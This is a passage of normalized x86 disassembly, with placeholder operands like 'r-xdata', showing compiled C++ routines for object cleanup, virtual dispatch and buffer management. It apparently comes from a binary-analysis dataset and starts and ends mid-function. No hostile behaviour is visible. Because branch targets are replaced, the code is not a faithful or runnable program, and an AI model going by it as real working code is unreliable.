mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0xf
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x90495
mov [ ebp - 0x4 ] 0x12
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x26ff
mov [ eax + 0xc ] 0xe661
mov [ eax + 0x10 ] 0xe5a8
mov [ ebp - 0x4 ] 0x11
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebx + 0x30 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100038e0
push 0x14
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x11
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x1a6a46
mov [ ebp - 0x4 ] 0x14
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x4d08
mov [ eax + 0xc ] 0xe76a
mov [ eax + 0x10 ] 0x1d0e8
mov [ ebp - 0x4 ] 0x13
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebx + 0x30 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100038e0
push 0x14
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x13
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebx + 0x30 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100038e0
push ebx
mov ecx esi
mov [ esi + 0x64 ] 0x0
call sub_10002360
xor eax eax
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x6c ] 0x5
mov [ esi + 0x70 ] 0x0
mov [ esi + 0x74 ] ax
mov [ esi + 0x78 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
sub_10002330
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002490
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10002360
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004b618
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x64 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0xc ]
mov [ esi + 0x64 ] eax
call sub_1003ba00
mov [ esp + 0x28 ] 0x0
lea edx [ esp + 0xc ]
mov ecx [ esi + 0x64 ]
push edx
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx [ esi + 0x64 ]
lea edx [ esp + 0xc ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov [ esp + 0x28 ] 0xffffffff
mov [ esp + 0xc ] r--data
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100023f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x60 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x60 ] eax
pop esi
pop ebp
retn 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10002410
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004b618
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esp + 0xc ]
call sub_1003ba00
mov [ esp + 0x28 ] 0x0
lea edx [ esp + 0xc ]
mov ecx [ esi + 0x64 ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ esi + 0x60 ]
lea edx [ esp + 0xc ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov [ esp + 0x28 ] 0xffffffff
mov [ esp + 0xc ] r--data
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10002490
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b68a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x6
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x24 ]
mov ecx [ esi + 0x2c ]
mov eax 0x2aaaaaab
sub ecx [ esi + 0x28 ]
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov ecx [ esi + 0x38 ]
mov eax 0x2aaaaaab
sub ecx [ esi + 0x34 ]
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x44 ]
mov eax 0x2aaaaaab
sub ecx [ esi + 0x40 ]
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x50 ]
mov eax 0x2aaaaaab
sub ecx [ esi + 0x4c ]
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x60 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov ecx [ esi + 0x64 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x5
mov [ esi + 0x58 ] r--data
mov [ ebp - 0x4 ] 0x4
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] 0x0
mov [ esi + 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x40 ] 0x0
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x8
jb r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x20 ] 0x7
xor eax eax
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100026e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea edx [ eax + eax * 2 ]
mov eax [ ecx + 0x4c ]
push [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
pop ebp
retn 0x10
sub_10002710
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
lea edi [ ebx + ebx * 2 ]
shl edi 0x2
mov eax [ esi + 0x4c ]
mov ecx [ edi + eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov edi [ esi + 0x50 ]
add eax 0xc
cmp eax edi
je r-xdata
add eax edi
add [ esi + 0x50 ] 0xfffffff4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
lea edx [ eax - 0xc ]
jmp r-xdata
movq xmm0 [ eax ]
lea edx [ edx + 0xc ]
movq [ edx - 0xc ] xmm0
mov ecx [ eax + 0x8 ]
add eax 0xc
mov [ edx - 0x4 ] ecx
cmp eax edi
jne r-xdata
sub_100027a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b6ce
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0xc ]
cmp edi 0x40000
jbe r-xdata
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push 0x2c
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp + 0xc ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov ecx eax
call sub_10037bc0
mov esi eax
jmp r-xdata
push edi
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebx + 0xc ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1002b560
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebx + 0x28 ]
mov [ ebp - 0x1c ] ax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov [ eax ] esi
lea eax [ ebp - 0x1c ]
push eax
call sub_10003710
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_100028c0
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
mov ecx [ ecx + 0x2c ]
cmp eax ecx
je r-xdata
xor eax eax
pop ebp
retn 0x10
mov edx [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ecx ]
push [ ebp + 0xc ]
call [ eax + 0x10 ]
pop ebp
retn 0x10
add eax 0xc
cmp eax ecx
jne r-xdata
cmp edx [ eax + 0x4 ]
je r-xdata
sub_10002900
push ebp
mov ebp esp
push ecx
mov eax ecx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ eax + 0x28 ]
mov eax [ eax + 0x2c ]
cmp esi eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ esi + 0x4 ]
mov ecx ebx
push edi
mov eax [ ebx ]
call [ eax + 0xc ]
mov edi eax
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x8 ]
cmp edi eax
jne r-xdata
add esi 0xc
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov edi [ ebp - 0x4 ]
push esi
lea ecx [ edi + 0x34 ]
call sub_10003710
mov ebx 0x1
jmp r-xdata
cmp ecx [ esi + 0x4 ]
je r-xdata
mov edi [ ebp - 0x4 ]
xor ebx ebx
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ edi + 0x2c ]
add esi 0xc
cmp esi eax
je r-xdata
add [ edi + 0x2c ] 0xfffffff4
mov eax ebx
pop edi
pop ebx
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi - 0xc ]
jmp r-xdata
movq xmm0 [ esi ]
lea edx [ edx + 0xc ]
movq [ edx - 0xc ] xmm0
mov ecx [ esi + 0x8 ]
add esi 0xc
mov [ edx - 0x4 ] ecx
cmp esi eax
jne r-xdata
sub_100029b0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x28 ]
mov eax [ edi + 0x2c ]
cmp esi eax
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
add esi 0xc
cmp esi eax
jne r-xdata
mov edx [ edi + 0x2c ]
add esi 0xc
cmp esi edx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp edx [ esi + 0x4 ]
je r-xdata
add [ edi + 0x2c ] 0xfffffff4
mov eax 0x1
pop edi
pop esi
pop ebp
retn 0x4
lea ecx [ esi - 0xc ]
movq xmm0 [ esi ]
lea ecx [ ecx + 0xc ]
movq [ ecx - 0xc ] xmm0
mov eax [ esi + 0x8 ]
add esi 0xc
mov [ ecx - 0x4 ] eax
cmp esi edx
jne r-xdata
sub_10002a20
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x68 ]
cmp eax [ esi + 0x6c ]
jbe r-xdata
call sub_10002a60
test eax eax
jne r-xdata
mov [ esi + 0x4 ] 0x1
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_100031e0
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
sub_10002a60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b6f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x8 ]
xor ebx ebx
xor esi esi
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x20 ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx [ edi + 0x64 ]
push edx
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
lea ebx [ ebx ]
xor eax eax
mov ecx edi
call sub_10002b60
mov ecx [ edi + 0x64 ]
lea edx [ ebp - 0x20 ]
push edx
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax 0x1
jmp r-xdata
inc esi
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0x1c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x20 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0x14 ]
mov ecx eax
mov edx [ eax ]
mov eax [ edx + 0xc ]
call eax
cmp al 0xa
jne r-xdata
test ebx ebx
je r-xdata
inc ebx
push eax
mov ecx edi
call sub_10002d80
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0x20 ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
cmp esi eax
jb r-xdata
sub_10002b60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b756
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov edx [ edi + 0x44 ]
mov eax 0x2aaaaaab
sub edx [ edi + 0x40 ]
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov esi 0x2
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x40 ]
mov [ ebp - 0x14 ] 0x1133f
mov ax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0x1c ] ax
mov eax [ ecx ]
call [ eax + 0xc ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10003710
push 0x3c
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x1133f
mov [ ebp - 0x1c ] ax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_10003710
dec esi
jne r-xdata
push 0x3c
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x4 ] 0x4
test esi esi
je r-xdata
xor ecx ecx
push 0x1
sub esp 0xc
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x2c ] esp
push eax
call sub_10003820
mov [ ebp - 0x4 ] 0x2
movzx eax [ edi + 0x74 ]
push 0x2
push eax
movzx eax [ edi + 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov ecx esi
call sub_10034f50
mov ecx eax
jmp r-xdata
xor ecx ecx
push 0x1
sub esp 0xc
lea eax [ ebp - 0x28 ]
mov ecx esp
mov [ ebp - 0x30 ] esp
push eax
call sub_10003820
mov [ ebp - 0x4 ] 0x5
movzx eax [ edi + 0x74 ]
push 0x2
push eax
movzx eax [ edi + 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x4
mov ecx esi
call sub_10034f50
mov ecx eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
lea esi [ ecx + 0x4 ]
mov eax [ eax + 0x4 ]
add esi eax
xor esi esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
lea esi [ ecx + 0x4 ]
mov eax [ eax + 0x4 ]
add esi eax
xor esi esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x3
test ecx ecx
jne r-xdata
test esi esi
jne r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x8 ]
push esi
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
sub_10002d80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b7dc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x44 ] ebx
mov esi [ ebp + 0x8 ]
mov ecx esi
mov eax [ esi ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc ]
inc [ ebx + 0x68 ]
lea ecx [ ebp - 0x74 ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x74 ]
mov ecx [ ebx + 0x64 ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ ebx + 0x64 ]
lea edx [ ebp - 0x74 ]
push edx
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x74 ] r--data
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
cmp eax 0xa
jne r-xdata
mov eax [ esi ]
mov ecx esi
push r--data
call [ eax + 0x14 ]
mov edx [ ebx ]
mov edi eax
inc [ ebx + 0x70 ]
mov ecx ebx
mov [ ebp - 0x54 ] edi
call [ edx + 0xc ]
lea ecx [ ebp - 0x84 ]
call sub_1003ba00
mov [ ebp - 0x4 ] 0x1
mov eax 0x66666667
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
imul ecx
mov [ ebp - 0x4c ] 0x1
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov eax 0x66666667
sub ecx [ edi + 0xc ]
imul ecx
mov [ ebp - 0x40 ] 0x0
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov ecx [ ebx + 0x64 ]
lea edx [ ebp - 0x84 ]
push edx
mov eax [ ecx ]
call [ eax + 0x10 ]
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov ecx [ edi + 0x10 ]
mov eax 0x66666667
sub ecx [ edi + 0xc ]
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
lea esi [ ebx + 0x40 ]
mov [ ebp - 0x48 ] esi
xor eax eax
mov [ ebx + 0x74 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x84 ] r--data
jmp r-xdata
mov ecx [ ebx + 0x64 ]
lea edx [ ebp - 0x84 ]
push edx
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ ebx + 0x64 ]
lea edx [ ebp - 0x84 ]
push edx
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x38 ] 0x40000
mov [ ebp - 0x64 ] cx
mov [ ebp - 0x5c ] 0x0
jbe r-xdata
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push 0x18
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x4 ] 0x6
test edi edi
je r-xdata
push 0x2c
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x4 ] 0x4
test esi esi
je r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
push [ ebp - 0x1c ]
cmovae edx [ ebp - 0x2c ]
mov eax [ ecx ]
push edx
push [ ebp - 0x30 ]
call [ eax + 0x10 ]
mov ebx [ esi + 0x4 ]
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x8 ]
mov edx [ ebx ]
mov ecx ebx
mov edi eax
call [ edx + 0xc ]
mov ecx [ esi + 0x4 ]
cmp edi eax
mov eax [ ecx ]
jne r-xdata
add esi 0xc
cmp esi eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x38 ]
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x7
push eax
mov [ edi ] r--data
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
call sub_1003cdeb
add esp 0x4
mov [ edi + 0xc ] eax
push [ edi + 0x4 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
push [ ebp - 0x38 ]
xor eax eax
sub esp 0x18
mov ecx esp
mov [ ebp - 0x58 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebx + 0xc ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x4
mov ecx esi
call sub_1002b560
mov edi eax
jmp r-xdata
call [ eax + 0xc ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x4c ] 0x0
call [ eax + 0x18 ]
mov edi [ ebp - 0x48 ]
mov edx [ edi + 0x4 ]
cmp [ ebp - 0x34 ] eax
jne r-xdata
cmp [ esi ] cx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x1c ]
cmovae ecx [ ebp - 0x2c ]
push ecx
push [ ebp - 0x30 ]
mov ecx edi
call [ eax + 0x10 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
mov edx [ edi ]
mov ecx edi
mov esi eax
call [ edx + 0x8 ]
cmp eax esi
jne r-xdata
push 0x1
mov ecx edi
call [ eax ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov ecx edi
mov eax [ edi ]
mov [ ebp - 0x60 ] edi
call [ eax + 0x4 ]
test eax eax
mov eax [ edi ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
add esi 0xc
cmp esi edx
je r-xdata
movq xmm0 [ esi ]
mov eax [ esi + 0x8 ]
add esi 0xc
movq [ ebp - 0x70 ] xmm0
mov [ ebp - 0x68 ] eax
cmp esi edx
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebx + 0x40 ]
call sub_10003710
mov eax [ edi ]
mov ecx edi
call [ eax + 0x18 ]
cmp [ ebp - 0x34 ] eax
jne r-xdata
mov edi [ ebp - 0x54 ]
mov eax 0x66666667
mov esi [ ebp - 0x40 ]
inc esi
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x40 ] esi
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
imul ecx
mov [ ebp - 0x1c ] 0x0
sar edx 0x4
mov eax edx
mov [ ebp - 0x2c ] 0x0
shr eax 0x1f
add eax edx
cmp esi eax
lea esi [ ebx + 0x40 ]
jb r-xdata
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
add [ edi + 0x4 ] 0xfffffff4
jmp r-xdata
lea ecx [ esi - 0xc ]
mov ebx [ ebp - 0x44 ]
lea eax [ ebp - 0x70 ]
add [ edi + 0x4 ] 0xfffffff4
push eax
lea ecx [ ebx + 0x4c ]
call sub_10003710
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x74 ] ax
jmp r-xdata
lea ecx [ esi - 0xc ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebx + 0x4c ]
call sub_10003710
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x74 ] ax
jmp r-xdata
push [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov ecx edi
push eax
call sub_10001e50
mov [ ebp - 0x4 ] 0x2
mov cx [ ebp - 0x3c ]
mov esi [ esi ]
movzx eax cx
mov [ ebp - 0x50 ] eax
mov eax [ ebx + 0x44 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
mov ebx [ ebp - 0x44 ]
movq xmm0 [ esi ]
lea ecx [ ecx + 0xc ]
movq [ ecx - 0xc ] xmm0
mov eax [ esi + 0x8 ]
add esi 0xc
mov [ ecx - 0x4 ] eax
cmp esi edx
jne r-xdata
jmp r-xdata
movq xmm0 [ esi ]
lea ecx [ ecx + 0xc ]
movq [ ecx - 0xc ] xmm0
mov eax [ esi + 0x8 ]
add esi 0xc
mov [ ecx - 0x4 ] eax
cmp esi edx
jne r-xdata
sub_100031e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b6f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
